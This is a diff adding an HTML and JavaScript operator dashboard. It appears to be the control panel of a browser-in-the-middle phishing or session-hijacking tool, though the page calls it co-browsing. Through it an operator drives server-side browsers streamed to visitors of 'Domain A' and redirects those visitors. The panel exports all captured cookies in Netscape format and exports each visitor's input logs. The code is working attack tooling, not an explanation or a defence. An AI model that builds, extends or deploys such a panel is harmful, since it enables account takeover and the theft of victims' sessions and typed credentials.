@@ -1,0 +1,801 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Operator — Domain B</title>
+<style>
+  body{margin:0;font-family:system-ui,Arial,sans-serif;background:#0b1220;color:#e5e7eb;height:100vh;display:flex;flex-direction:column}
+  header{background:#111827;padding:10px 16px;font-weight:600;border-bottom:1px solid #1f2937}
+  .wrap{flex:1;display:flex;min-height:0}
+  .left{width:300px;border-right:1px solid #1f2937;padding:12px;overflow:auto}
+  .right{flex:1;display:flex;flex-direction:column;min-width:0}
+  h2{font-size:13px;text-transform:uppercase;letter-spacing:.05em;color:#9ca3af;margin:6px 0}
+  .visitor{background:#111827;border:1px solid #1f2937;border-radius:8px;padding:10px;margin-bottom:8px;transition: border-color 0.2s, background 0.2s;}
+  .visitor.active{border-color:#3b82f6;background:#1e293b}
+  .visitor .url{color:#93c5fd;font-family:monospace;word-break:break-all}
+  .visitor .sid{font-size:11px;color:#6b7280;margin-top:4px}
+  .history-item{font-size:11px;color:#9ca3af;padding-left:12px;position:relative;margin-top:2px}
+  .history-item::before{content:"↳";position:absolute;left:2px;color:#6b7280}
+  button{background:#2563eb;color:#fff;border:0;border-radius:6px;padding:6px 10px;cursor:pointer;font-size:12px;margin-top:6px}
+  button.stop{background:#b91c1c}
+  .badge{display:inline-block;background:#16a34a;color:#fff;font-size:10px;padding:1px 6px;border-radius:10px;margin-left:6px}
+  .badge.online { background: #10b981; }
+  .badge.offline { background: #4b5563; }
+  .badge.sess-active { background: #3b82f6; }
+  .badge.sess-inactive { background: #374151; }
+  .visitor-buttons { display: flex; gap: 4px; flex-wrap: wrap; margin-top: 6px; }
+  .visitor-buttons button { margin: 0; padding: 4px 8px; font-size: 11px; }
+  .bar{display:flex;gap:6px;padding:8px;background:#111827;border-bottom:1px solid #1f2937}
+  .bar input{flex:1;padding:6px 8px;border-radius:6px;border:1px solid #374151;background:#0b1220;color:#fff}
+  #screen{flex:1;background:#000;display:flex;align-items:center;justify-content:center;min-height:0}
+  #screen canvas{max-width:100%;max-height:100%;object-fit:contain;cursor:crosshair;display:block}
+  .hint{color:#6b7280;font-size:12px;padding:6px 8px}
+
+  .custom-context-menu {
+    position: absolute;
+    background: rgba(30, 41, 59, 0.95);
+    backdrop-filter: blur(8px);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3), 0 4px 6px -4px rgba(0, 0, 0, 0.3);
+    border-radius: 8px;
+    padding: 6px 0;
+    min-width: 140px;
+    z-index: 10000;
+    font-family: system-ui, -apple-system, sans-serif;
+    user-select: none;
+  }
+  .custom-context-menu-item {
+    padding: 8px 12px;
+    color: #f1f5f9;
+    cursor: pointer;
+    font-size: 14px;
+    transition: background 0.15s;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .custom-context-menu-item:hover {
+    background: rgba(59, 130, 246, 0.5);
+  }
+  .custom-context-menu-item.disabled {
+    color: #64748b;
+    cursor: not-allowed;
+    background: transparent !important;
+  }
+  .custom-context-menu-shortcut {
+    font-size: 11px;
+    color: #94a3b8;
+    margin-left: 16px;
+  }
+  .section-title {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    color: #94a3b8;
+    margin-bottom: 8px;
+    padding: 4px 8px;
+  }
+  @media (max-width: 768px) {
+    .wrap {
+      flex-direction: column;
+      overflow: auto;
+    }
+    .left {
+      width: 100%;
+      box-sizing: border-box;
+      border-right: none;
+      border-bottom: 1px solid #1f2937;
+      max-height: 250px;
+    }
+    header {
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 12px;
+    }
+    header button {
+      width: 100%;
+    }
+    .settings-bar {
+      flex-direction: column;
+      align-items: stretch;
+      gap: 12px;
+      padding: 12px;
+    }
+    .settings-bar div {
+      width: 100%;
+    }
+    .bar {
+      flex-direction: column;
+      gap: 8px;
+    }
+    .bar input {
+      width: 100%;
+      box-sizing: border-box;
+    }
+    #tab-bar {
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 8px;
+    }
+    #tab-bar span {
+      margin-left: 0 !important;
+    }
+  }
+</style>
+</head>
+<body>
+<header style="display: flex; justify-content: space-between; align-items: center; gap: 16px;">
+  <div>Operator Dashboard <span class="badge">Domain B</span> — drive independent browser sessions per visitor</div>
+  <a href="/api/cookies/export" download="cookies.txt" style="text-decoration: none;">
+    <button style="margin: 0; background: #059669; font-weight: 600; display: flex; align-items: center; gap: 4px;">📥 Export All Cookies (Netscape)</button>
+  </a>
+</header>
+<div class="settings-bar" style="display: flex; gap: 16px; padding: 10px 16px; background: #1f2937; border-bottom: 1px solid #1f2937; align-items: center;">
+  <label style="display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 13px; font-weight: 500; color: #e5e7eb; user-select: none;">
+    <input type="checkbox" id="chk-auto-cast" style="cursor: pointer; width: 15px; height: 15px; margin: 0;">
+    <span>⚡ Auto-Cast New Visitors</span>
+  </label>
+  <div style="display: flex; align-items: center; gap: 8px; flex: 1;">
+    <span style="font-size: 13px; font-weight: 500; color: #9ca3af; white-space: nowrap;">Default Cast URL:</span>
+    <input type="text" id="txt-default-url" placeholder="e.g. wikipedia.org (empty starts on visitor's current page)" style="flex: 1; padding: 6px 10px; border-radius: 6px; border: 1px solid #374151; background: #0b1220; color: #fff; font-size: 13px;">
+  </div>
+</div>
+<div class="wrap">
+  <div class="left">
+    <h2>Live visitors on Domain A</h2>
+    <div id="visitors"></div>
+  </div>
+  <div class="right">
+    <div class="bar">
+      <input id="url" placeholder="Type a URL and press Enter to browse in your server session (e.g. wikipedia.org)" disabled>
+      <button id="btn-crop-mode" style="margin: 0; background: #4f46e5; display: none;">✂️ Select Crop Area</button>
+      <button id="btn-reset-crop" style="margin: 0; background: #ef4444; display: none;">🔄 Reset Crop</button>
+    </div>
+    <div id="tab-bar" style="display: none; background: #111827; border-bottom: 1px solid #1f2937; padding: 6px 12px; gap: 12px; align-items: center;">
+      <div style="display: flex; gap: 8px;">
+        <div class="tab-group" style="display: flex; align-items: center; background: #1f2937; border-radius: 4px; padding: 2px;">
+          <button id="tab-btn-1" class="tab-button" onclick="clickTab('tab1')" style="margin: 0; padding: 6px 12px; background: #3b82f6; border: none; color: #fff; font-weight: 600; cursor: pointer; border-radius: 3px 0 0 3px; font-size: 12px;">Tab 1</button>
+          <button id="broadcast-btn-1" onclick="broadcastTab('tab1')" style="margin: 0; padding: 6px 8px; background: #374151; border: none; color: #9ca3af; cursor: pointer; border-radius: 0 3px 3px 0; font-size: 11px;">📡 Cast</button>
+        </div>
+        <div class="tab-group" style="display: flex; align-items: center; background: #1f2937; border-radius: 4px; padding: 2px;">
+          <button id="tab-btn-2" class="tab-button" onclick="clickTab('tab2')" style="margin: 0; padding: 6px 12px; background: #374151; border: none; color: #fff; font-weight: 600; cursor: pointer; border-radius: 3px 0 0 3px; font-size: 12px;">Tab 2</button>
+          <button id="broadcast-btn-2" onclick="broadcastTab('tab2')" style="margin: 0; padding: 6px 8px; background: #374151; border: none; color: #9ca3af; cursor: pointer; border-radius: 0 3px 3px 0; font-size: 11px;">📡 Cast</button>
+        </div>
+      </div>
+      <span style="font-size: 11px; color: #9ca3af; margin-left: auto;">(Both tabs share cookies and local storage. Click 'Cast' to stream to visitors.)</span>
+    </div>
+    <div class="hint" id="status-hint">Please select a visitor from the list to start or view co-browsing.</div>
+    <div id="screen">
+      <div id="screen-wrapper" style="position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center;">
+        <canvas id="display-canvas" style="display: none;"></canvas>
+        <div id="selection-overlay" style="position: absolute; display: none; cursor: crosshair; z-index: 10; overflow: hidden; background: rgba(0,0,0,0.4);">
+          <div id="selection-box" style="position: absolute; border: 2px dashed #3b82f6; box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.6); display: none; pointer-events: none;">
+            <div id="selection-actions" style="position: absolute; bottom: -45px; left: 50%; transform: translateX(-50%); display: flex; gap: 8px; background: #1f2937; padding: 6px; border-radius: 6px; border: 1px solid #374151; pointer-events: auto; z-index: 11;">
+              <button id="btn-apply-crop" style="margin: 0; padding: 4px 8px; background: #10b981; color: white;">Apply</button>
+              <button id="btn-cancel-crop" style="margin: 0; padding: 4px 8px; background: #6b7280; color: white;">Cancel</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+  window.socket = socket;
+  socket.emit('operator:hello');
+
+  const canvas = document.getElementById('display-canvas');
+  const ctx = canvas.getContext('2d');
+  const selectionOverlay = document.getElementById('selection-overlay');
+  const selectionBox = document.getElementById('selection-box');
+  const btnCropMode = document.getElementById('btn-crop-mode');
+  const btnResetCrop = document.getElementById('btn-reset-crop');
+
+  let visitorList = [];
+  let activeSessionId = null;
+  let cropState = null;
+  const sessionCrops = new Map();
+
+  let isSelecting = false;
+  let startX = 0, startY = 0;
+  let boxStartX = 0, boxStartY = 0;
+
+  // screencast handler
+  socket.on('frame', ({ sessionId, b64 }) => {
+    if (sessionId !== activeSessionId) return;
+    const img = new Image();
+    img.onload = () => {
+      if (cropState) {
+        canvas.width = img.naturalWidth * cropState.w;
+        canvas.height = img.naturalHeight * cropState.h;
+        ctx.drawImage(
+          img,
+          cropState.x * img.naturalWidth,
+          cropState.y * img.naturalHeight,
+          cropState.w * img.naturalWidth,
+          cropState.h * img.naturalHeight,
+          0, 0, canvas.width, canvas.height
+        );
+      } else {
+        canvas.width = img.naturalWidth;
+        canvas.height = img.naturalHeight;
+        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+      }
+    };
+    img.src = 'data:image/jpeg;base64,' + b64;
+  });
+
+  // crop state update handler
+  socket.on('crop:change', ({ sessionId, crop }) => {
+    sessionCrops.set(sessionId, crop);
+    if (sessionId === activeSessionId) {
+      cropState = crop;
+      btnResetCrop.style.display = crop ? 'block' : 'none';
+    }
+  });
+
+  socket.on('tab:change', ({ sessionId, activeTab, url }) => {
+    const v = visitorList.find(x => x.sessionId === sessionId);
+    if (v) {
+      v.activeTab = activeTab;
+      if (activeTab === 'tab1') v.url1 = url;
+      else v.url2 = url;
+    }
+    if (sessionId === activeSessionId) {
+      setActiveTabUI(activeTab);
+      const urlInput = document.getElementById('url');
+      if (document.activeElement !== urlInput) {
+        urlInput.value = url;
+      }
+    }
+  });
+
+  socket.on('broadcast-tab:change', ({ sessionId, broadcastTab }) => {
+    const v = visitorList.find(x => x.sessionId === sessionId);
+    if (v) {
+      v.broadcastTab = broadcastTab;
+    }
+    if (sessionId === activeSessionId) {
+      setBroadcastTabUI(broadcastTab);
+    }
+  });
+
+  // render visitor list
+  socket.on('visitors', list => {
+    visitorList = list;
+    const el = document.getElementById('visitors');
+    if (!list.length) {
+      el.innerHTML = '<div class="hint">No visitors yet. Open Domain A in another tab.</div>';
+      activeSessionId = null;
+      updateActiveSessionUI();
+      return;
+    }
+
+    const renderVisitor = (v) => {
+      const isActive = v.sessionId === activeSessionId;
+      const isDefault = v.sessionId === 'default';
+      const displayName = isDefault ? '🌟 Operator Scratchpad (default)' : v.sessionId;
+      const historyHtml = isDefault ? '' : `<div class="url">${v.displayUrl}</div>`;
+      const onlineBadge = isDefault ? '' : (v.online ? '<span class="badge online">Online</span>' : '<span class="badge offline">Offline</span>');
+      const activeBadge = v.active ? '<span class="badge sess-active">Active</span>' : '<span class="badge sess-inactive">Inactive</span>';
+      
+      return `
+        <div class="visitor ${isActive ? 'active' : ''}" data-session-id="${v.sessionId}" onclick="selectVisitor('${v.sessionId}')" style="cursor: pointer;">
+          ${historyHtml}
+          <div class="sid" style="display: flex; gap: 4px; align-items: center; flex-wrap: wrap;">
+            <span>${displayName}</span>
+            ${onlineBadge}
+            ${activeBadge}
+          </div>
+          <div class="visitor-buttons">
+            ${v.active
+              ? `<button class="stop" onclick="event.stopPropagation(); closeSession('${v.sessionId}')">Close Session</button>`
+              : `<button onclick="event.stopPropagation(); openSession('${v.sessionId}')">Open Session</button>`}
+            ${!isDefault && v.online
+              ? (v.casting
+                ? `<button class="stop" onclick="event.stopPropagation(); stopCast('${v.sessionId}')">Stop Casting</button>`
+                : `<button onclick="event.stopPropagation(); cast('${v.sessionId}')">Cast to Visitor</button>`)
+              : ''}
+            ${!isDefault && v.online
+              ? `<button style="background: #ea580c;" onclick="event.stopPropagation(); redirectVisitor('${v.sessionId}')">Redirect</button>`
+              : ''}
+            <a href="/api/cookies/export/${v.sessionId}" download="cookies-${v.sessionId}.txt" onclick="event.stopPropagation();" style="text-decoration: none;">
+              <button style="background: #059669;">Export Cookies</button>
+            </a>
+            <a href="/api/logs/export/${v.sessionId}" download="${v.sessionId}-input.log" onclick="event.stopPropagation();" style="text-decoration: none;">
+              <button style="background: #2563eb;">Export Logs</button>
+            </a>
+            <button class="stop" style="background: #dc2626;" onclick="event.stopPropagation(); deleteSession('${v.sessionId}')">Delete Session</button>
+          </div>
+        </div>`;
+    };
+
+    const activeList = list.filter(v => v.online || v.active || v.sessionId === 'default');
+    const historyList = list.filter(v => !v.online && !v.active && v.sessionId !== 'default');
+
+    let html = '';
+    
+    html += '<div class="section-title">Active & Online Visitors</div>';
+    if (!activeList.length) {
+      html += '<div class="hint">No active visitors yet. Open Domain A in another tab.</div>';
+    } else {
+      html += activeList.map(renderVisitor).join('');
+    }
+
+    html += '<div class="section-title" style="margin-top: 24px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 16px;">Saved Sessions (History)</div>';
+    if (!historyList.length) {
+      html += '<div class="hint">No saved offline sessions yet.</div>';
+    } else {
+      html += historyList.map(renderVisitor).join('');
+    }
+
+    el.innerHTML = html;
+
+    // Auto-select first active/online visitor if none active
+    if (!activeSessionId) {
+      const firstActive = list.find(x => x.active);
+      if (firstActive) selectVisitor(firstActive.sessionId);
+      else selectVisitor(list[0].sessionId);
+    } else {
+      // Re-verify activeSessionId still exists
+      const activeExists = list.some(x => x.sessionId === activeSessionId);
+      if (!activeExists) {
+        activeSessionId = null;
+        if (list.length > 0) selectVisitor(list[0].sessionId);
+        else updateActiveSessionUI();
+      } else {
+        updateActiveSessionUI();
+      }
+    }
+  });
+
+  socket.on('operator:show-context-menu', ({ info, clientX, clientY }) => {
+    showContextMenu(clientX, clientY, info, socket, true, activeSessionId);
+  });
+
+  function selectVisitor(sessionId) {
+    activeSessionId = sessionId;
+    updateActiveSessionUI();
+  }
+
+  function updateActiveSessionUI() {
+    const v = visitorList.find(x => x.sessionId === activeSessionId);
+    const hint = document.getElementById('status-hint');
+    const urlInput = document.getElementById('url');
+
+    document.querySelectorAll('.visitor').forEach(el => {
+      if (el.dataset.sessionId === activeSessionId) el.classList.add('active');
+      else el.classList.remove('active');
+    });
+
+    const tabBar = document.getElementById('tab-bar');
+
+    if (!v) {
+      hint.innerHTML = 'Please select a visitor session from the list to view/drive.';
+      canvas.style.display = 'none';
+      btnCropMode.style.display = 'none';
+      btnResetCrop.style.display = 'none';
+      tabBar.style.display = 'none';
+      urlInput.disabled = true;
+      urlInput.value = '';
+      return;
+    }
+
+    cropState = sessionCrops.get(activeSessionId) || null;
+    btnResetCrop.style.display = cropState ? 'block' : 'none';
+
+    if (v.active) {
+      hint.innerHTML = `Viewing active browser session for <b>${v.sessionId}</b>. Clicks/keystrokes are active.`;
+      canvas.style.display = 'block';
+      btnCropMode.style.display = 'block';
+      tabBar.style.display = 'flex';
+      urlInput.disabled = false;
+      
+      setActiveTabUI(v.activeTab);
+      setBroadcastTabUI(v.broadcastTab);
+      if (document.activeElement !== urlInput) {
+        urlInput.value = v.activeTab === 'tab1' ? v.url1 : v.url2;
+      }
+    } else {
+      hint.innerHTML = `Session <b>${v.sessionId}</b> is inactive. Click "Open Session" to start/load the browser state.`;
+      canvas.style.display = 'none';
+      btnCropMode.style.display = 'none';
+      btnResetCrop.style.display = 'none';
+      tabBar.style.display = 'none';
+      urlInput.disabled = true;
+    }
+  }
+
+  window.openSession = id => socket.emit('operator:open-session', { sessionId: id });
+  window.closeSession = id => socket.emit('operator:close-session', { sessionId: id });
+  window.cast = id => socket.emit('operator:cast', { targetSessionId: id, sessionId: activeSessionId });
+  window.stopCast = id => socket.emit('operator:stopcast', { sessionId: id });
+  window.redirectVisitor = id => {
+    const url = prompt("Enter redirect URL (e.g. google.com):", "https://google.com");
+    if (url) {
+      socket.emit('operator:redirect-visitor', { sessionId: id, url });
+    }
+  };
+
+  window.deleteSession = async id => {
+    if (confirm(`Are you sure you want to delete session ${id}? This will close the browser and delete all saved cookies and input logs.`)) {
+      try {
+        const res = await fetch(`/api/sessions/delete/${id}`, { method: 'POST' });
+        if (!res.ok) {
+          alert('Failed to delete session');
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    }
+  };
+
+  const chkAutoCast = document.getElementById('chk-auto-cast');
+  const txtDefaultUrl = document.getElementById('txt-default-url');
+
+  socket.on('settings:init', ({ autoCastEnabled, defaultCastUrl }) => {
+    chkAutoCast.checked = autoCastEnabled;
+    txtDefaultUrl.value = defaultCastUrl;
+  });
+
+  socket.on('settings:change', ({ autoCastEnabled, defaultCastUrl }) => {
+    chkAutoCast.checked = autoCastEnabled;
+    txtDefaultUrl.value = defaultCastUrl;
+  });
+
+  function sendSettings() {
+    socket.emit('operator:update-settings', {
+      autoCastEnabled: chkAutoCast.checked,
+      defaultCastUrl: txtDefaultUrl.value
+    });
+  }
+
+  chkAutoCast.addEventListener('change', sendSettings);
+  txtDefaultUrl.addEventListener('change', sendSettings);
+
+  window.clickTab = tab => {
+    if (activeSessionId) {
+      socket.emit('operator:switch-tab', { sessionId: activeSessionId, tab });
+      setActiveTabUI(tab);
+    }
+  };
+
+  window.broadcastTab = tab => {
+    if (activeSessionId) {
+      socket.emit('operator:set-broadcast-tab', { sessionId: activeSessionId, tab });
+      setBroadcastTabUI(tab);
+    }
+  };
+
+  function setActiveTabUI(tab) {
+    const t1 = document.getElementById('tab-btn-1');
+    const t2 = document.getElementById('tab-btn-2');
+    if (tab === 'tab1') {
+      t1.style.background = '#3b82f6';
+      t2.style.background = '#374151';
+    } else {
+      t1.style.background = '#374151';
+      t2.style.background = '#3b82f6';
+    }
+  }
+
+  function setBroadcastTabUI(tab) {
+    const b1 = document.getElementById('broadcast-btn-1');
+    const b2 = document.getElementById('broadcast-btn-2');
+    if (tab === 'tab1') {
+      b1.style.background = '#10b981';
+      b1.style.color = '#fff';
+      b1.innerText = '📡 Casting';
+      b2.style.background = '#374151';
+      b2.style.color = '#9ca3af';
+      b2.innerText = '📡 Cast';
+    } else {
+      b1.style.background = '#374151';
+      b1.style.color = '#9ca3af';
+      b1.innerText = '📡 Cast';
+      b2.style.background = '#10b981';
+      b2.style.color = '#fff';
+      b2.innerText = '📡 Casting';
+    }
+  }
+
+  // operator drives the server browser
+  function norm(e){
+    const r = canvas.getBoundingClientRect();
+    const aspect = canvas.width / canvas.height;
+    let scale, dw, dh;
+    if (r.width / r.height > aspect) {
+      scale = r.height / canvas.height;
+    } else {
+      scale = r.width / canvas.width;
+    }
+    dw = canvas.width * scale;
+    dh = canvas.height * scale;
+    const ox = r.left + (r.width - dw) / 2, oy = r.top + (r.height - dh) / 2;
+    const cx = (e.clientX - ox) / dw;
+    const cy = (e.clientY - oy) / dh;
+    if (cropState) {
+      return {
+        nx: cropState.x + cx * cropState.w,
+        ny: cropState.y + cy * cropState.h
+      };
+    } else {
+      return { nx: cx, ny: cy };
+    }
+  }
+
+  canvas.tabIndex = 0;
+  canvas.addEventListener('click', e => {
+    if (!activeSessionId) return;
+    const {nx,ny}=norm(e); if(nx<0||nx>1||ny<0||ny>1) return;
+    socket.emit('operator:input', { sessionId: activeSessionId, ev: {type:'click',nx,ny} });
+  });
+
+  canvas.addEventListener('keydown', e => {
+    if (!activeSessionId) return;
+    // Handle Ctrl+A
+    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'a') {
+      e.preventDefault();
+      socket.emit('operator:input', { sessionId: activeSessionId, ev: {type:'key',key:'Control+A'} });
+      return;
+    }
+    // Handle Ctrl+V (Paste)
+    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'v') {
+      e.preventDefault();
+      navigator.clipboard.readText().then(text => {
+        if (text) {
+          socket.emit('operator:paste', { sessionId: activeSessionId, text });
+        }
+      }).catch(() => {
+        const text = prompt("Paste text here:");
+        if (text) {
+          socket.emit('operator:paste', { sessionId: activeSessionId, text });
+        }
+      });
+      return;
+    }
+    // Allow other native browser shortcuts to pass through
+    if (e.ctrlKey || e.metaKey) {
+      return;
+    }
+
+    if (['Enter','Backspace','Delete','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown'].includes(e.key)) {
+      e.preventDefault();
+      socket.emit('operator:input', { sessionId: activeSessionId, ev: {type:'key',key:e.key} });
+    }
+    else if (e.key.length === 1) {
+      e.preventDefault();
+      socket.emit('operator:input', { sessionId: activeSessionId, ev: {type:'text',text:e.key} });
+    }
+  });
+  
+  canvas.addEventListener('paste', e => {
+    if (!activeSessionId) return;
+    e.preventDefault();
+    const text = (e.clipboardData || window.clipboardData).getData('text');
+    if (text) {
+      socket.emit('operator:paste', { sessionId: activeSessionId, text });
+    }
+  });
+
+  canvas.addEventListener('contextmenu', e => {
+    if (!activeSessionId) return;
+    e.preventDefault();
+    const { nx, ny } = norm(e);
+    socket.emit('operator:check-context', { sessionId: activeSessionId, nx, ny, clientX: e.clientX, clientY: e.clientY });
+  });
+
+  canvas.addEventListener('wheel', e => {
+    if (!activeSessionId) return;
+    e.preventDefault();
+    socket.emit('operator:input', { sessionId: activeSessionId, ev: {type:'scroll',dy:e.deltaY} });
+  }, {passive:false});
+
+  document.getElementById('url').addEventListener('keydown', e => {
+    if (!activeSessionId) return;
+    if (e.key === 'Enter') {
+      socket.emit('operator:input', { sessionId: activeSessionId, ev: {type:'goto',url:e.target.value} });
+    }
+  });
+
+  // crop selection overlay drawing logic
+  btnCropMode.addEventListener('click', () => {
+    const r = canvas.getBoundingClientRect();
+    const wrapper = document.getElementById('screen-wrapper');
+    const wr = wrapper.getBoundingClientRect();
+
+    selectionOverlay.style.left = (r.left - wr.left) + 'px';
+    selectionOverlay.style.top = (r.top - wr.top) + 'px';
+    selectionOverlay.style.width = r.width + 'px';
+    selectionOverlay.style.height = r.height + 'px';
+    selectionOverlay.style.display = 'block';
+
+    selectionBox.style.display = 'none';
+    isSelecting = false;
+  });
+
+  selectionOverlay.addEventListener('mousedown', (e) => {
+    if (e.target.id === 'btn-apply-crop' || e.target.id === 'btn-cancel-crop') return;
+    isSelecting = true;
+    const r = selectionOverlay.getBoundingClientRect();
+    startX = e.clientX;
+    startY = e.clientY;
+    boxStartX = startX - r.left;
+    boxStartY = startY - r.top;
+
+    selectionBox.style.left = boxStartX + 'px';
+    selectionBox.style.top = boxStartY + 'px';
+    selectionBox.style.width = '0px';
+    selectionBox.style.height = '0px';
+    selectionBox.style.display = 'block';
+  });
+
+  selectionOverlay.addEventListener('mousemove', (e) => {
+    if (!isSelecting) return;
+    const r = selectionOverlay.getBoundingClientRect();
+    const currentX = e.clientX - r.left;
+    const currentY = e.clientY - r.top;
+
+    const x = Math.min(boxStartX, currentX);
+    const y = Math.min(boxStartY, currentY);
+    const w = Math.abs(boxStartX - currentX);
+    const h = Math.abs(boxStartY - currentY);
+
+    selectionBox.style.left = x + 'px';
+    selectionBox.style.top = y + 'px';
+    selectionBox.style.width = w + 'px';
+    selectionBox.style.height = h + 'px';
+  });
+
+  selectionOverlay.addEventListener('mouseup', () => {
+    if (!isSelecting) return;
+    isSelecting = false;
+    const w = parseInt(selectionBox.style.width);
+    const h = parseInt(selectionBox.style.height);
+    if (w < 10 || h < 10) {
+      selectionBox.style.display = 'none';
+    }
+  });
+
+  document.getElementById('btn-cancel-crop').addEventListener('click', (e) => {
+    e.stopPropagation();
+    selectionOverlay.style.display = 'none';
+    selectionBox.style.display = 'none';
+  });
+
+  document.getElementById('btn-apply-crop').addEventListener('click', (e) => {
+    e.stopPropagation();
+    const r = selectionOverlay.getBoundingClientRect();
+    const x = parseInt(selectionBox.style.left);
+    const y = parseInt(selectionBox.style.top);
+    const w = parseInt(selectionBox.style.width);
+    const h = parseInt(selectionBox.style.height);
+
+    if (w >= 10 && h >= 10) {
+      const crop = {
+        x: x / r.width,
+        y: y / r.height,
+        w: w / r.width,
+        h: h / r.height
+      };
+      socket.emit('operator:set-crop', { sessionId: activeSessionId, crop });
+    }
+
+    selectionOverlay.style.display = 'none';
+    selectionBox.style.display = 'none';
+  });
+
+  btnResetCrop.addEventListener('click', () => {
+    socket.emit('operator:set-crop', { sessionId: activeSessionId, crop: null });
+  });
+
+  function showContextMenu(clientX, clientY, info, socket, isOperator, targetSessionId) {
+    const existing = document.getElementById('ctx-menu');
+    if (existing) existing.remove();
+
+    const menu = document.createElement('div');
+    menu.id = 'ctx-menu';
+    menu.className = 'custom-context-menu';
+    menu.style.left = clientX + 'px';
+    menu.style.top = clientY + 'px';
+
+    const itemCut = document.createElement('div');
+    itemCut.className = 'custom-context-menu-item' + (info.hasSelection ? '' : ' disabled');
+    itemCut.innerHTML = `<span>Cut</span><span class="custom-context-menu-shortcut">Ctrl+X</span>`;
+    if (info.hasSelection) {
+      itemCut.onclick = async () => {
+        try {
+          await navigator.clipboard.writeText(info.selectionText);
+          if (isOperator) {
+            socket.emit('operator:input', { sessionId: targetSessionId, ev: { type: 'key', key: 'Backspace' } });
+          } else {
+            socket.emit('visitor:input', { type: 'key', key: 'Backspace' });
+          }
+        } catch (e) { console.error(e); }
+        menu.remove();
+      };
+    }
+    menu.appendChild(itemCut);
+
+    const itemCopy = document.createElement('div');
+    itemCopy.className = 'custom-context-menu-item' + (info.hasSelection ? '' : ' disabled');
+    itemCopy.innerHTML = `<span>Copy</span><span class="custom-context-menu-shortcut">Ctrl+C</span>`;
+    if (info.hasSelection) {
+      itemCopy.onclick = async () => {
+        try {
+          await navigator.clipboard.writeText(info.selectionText);
+        } catch (e) { console.error(e); }
+        menu.remove();
+      };
+    }
+    menu.appendChild(itemCopy);
+
+    const itemPaste = document.createElement('div');
+    itemPaste.className = 'custom-context-menu-item';
+    itemPaste.innerHTML = `<span>Paste</span><span class="custom-context-menu-shortcut">Ctrl+V</span>`;
+    itemPaste.onclick = async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        if (text) {
+          sendPaste(text);
+        } else {
+          fallback();
+        }
+      } catch (e) {
+        fallback();
+      }
+      menu.remove();
+    };
+    menu.appendChild(itemPaste);
+
+    function fallback() {
+      const text = prompt("Paste text here:");
+      if (text) sendPaste(text);
+    }
+
+    function sendPaste(text) {
+      if (isOperator) {
+        socket.emit('operator:paste', { sessionId: targetSessionId, text });
+      } else {
+        socket.emit('visitor:paste', { text });
+      }
+    }
+
+    const divider = document.createElement('div');
+    divider.style.borderTop = '1px solid rgba(255,255,255,0.1)';
+    divider.style.margin = '4px 0';
+    menu.appendChild(divider);
+
+    const itemSelectAll = document.createElement('div');
+    itemSelectAll.className = 'custom-context-menu-item';
+    itemSelectAll.innerHTML = `<span>Select All</span><span class="custom-context-menu-shortcut">Ctrl+A</span>`;
+    itemSelectAll.onclick = () => {
+      if (isOperator) {
+        socket.emit('operator:input', { sessionId: targetSessionId, ev: { type: 'key', key: 'Control+A' } });
+      } else {
+        socket.emit('visitor:input', { type: 'key', key: 'Control+A' });
+      }
+      menu.remove();
+    };
+    menu.appendChild(itemSelectAll);
+
+    document.body.appendChild(menu);
+
+    const dismiss = () => {
+      menu.remove();
+      document.removeEventListener('click', dismiss);
+      document.removeEventListener('contextmenu', dismiss);
+    };
+    setTimeout(() => {
+      document.addEventListener('click', dismiss);
+      document.addEventListener('contextmenu', dismiss);
+    }, 10);
+  }
+</script>
+</body>
+</html>
